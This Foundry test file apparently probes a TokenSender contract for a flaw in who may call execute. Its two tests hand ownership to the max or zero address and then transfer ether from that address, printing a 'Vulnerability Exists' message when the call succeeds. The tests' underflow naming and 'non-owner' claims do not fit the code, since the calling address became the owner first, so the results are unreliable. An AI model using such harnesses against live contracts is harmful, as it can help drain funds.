// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xec329ffc97d75fe03428ae155fc7793431487f63.sol";

contract TokenSenderTest is Test {
    TokenSender tokenSender;
    address owner = address(0x1);
    address maxAddress = address(type(uint160).max);
    address zeroAddress = address(0);
    uint256 testValue = 0.1 ether;
    bytes emptyData = "";
    address receiver = address(0xABCD);

    function setUp() public {
        vm.startPrank(owner);
        tokenSender = new TokenSender(address(0));
        // Fund the contract directly with ether
        vm.deal(address(tokenSender), testValue);
        vm.stopPrank();
    }

    function testUnderflowWithMaxAddress() public {
        // Change owner to max address
        vm.prank(owner);
        tokenSender.changeOwner(maxAddress);
        
        console.log("--- BEFORE-Trigger ---");
        uint256 initialBalance = receiver.balance;
        console.log("Initial receiver balance:", initialBalance);
        uint256 contractBalance = address(tokenSender).balance;
        console.log("Contract balance:", contractBalance);

        console.log("--- Trigger execute (by maxAddress) ---");
        bool success;
        bytes memory response;
        vm.prank(maxAddress);
        (success, response) = address(tokenSender).call(
            abi.encodeWithSignature("execute(address,uint256,bytes)", receiver, testValue, emptyData)
        );

        console.log("--- AFTER-Trigger ---");
        uint256 newBalance = receiver.balance;
        console.log("New receiver balance:", newBalance);
        console.log("Expected balance increase:", testValue);
        console.log("Actual balance increase:", newBalance - initialBalance);

        if (success && (newBalance - initialBalance) == testValue) {
            console.log("Vulnerability Exists: Non-owner (maxAddress) successfully executed transfer");
        } else {
            console.log("Vulnerability not Exist: Either execution reverted or incorrect amount transferred");
        }
    }

    function testUnderflowWithZeroAddress() public {
        // Change owner to zero address
        vm.prank(owner);
        tokenSender.changeOwner(zeroAddress);

        console.log("--- BEFORE-Trigger ---");
        uint256 initialBalance = receiver.balance;
        console.log("Initial receiver balance:", initialBalance);
        uint256 contractBalance = address(tokenSender).balance;
        console.log("Contract balance:", contractBalance);

        console.log("--- Trigger execute (by zeroAddress) ---");
        bool success;
        bytes memory response;
        vm.prank(zeroAddress);
        (success, response) = address(tokenSender).call(
            abi.encodeWithSignature("execute(address,uint256,bytes)", receiver, testValue, emptyData)
        );

        console.log("--- AFTER-Trigger ---");
        uint256 newBalance = receiver.balance;
        console.log("New receiver balance:", newBalance);
        console.log("Expected balance increase:", testValue);
        console.log("Actual balance increase:", newBalance - initialBalance);

        if (success && (newBalance - initialBalance) == testValue) {
            console.log("Vulnerability Exists: Non-owner (zeroAddress) successfully executed transfer");
        } else {
            console.log("Vulnerability not Exist: Either execution reverted or incorrect amount transferred");
        }
    }
}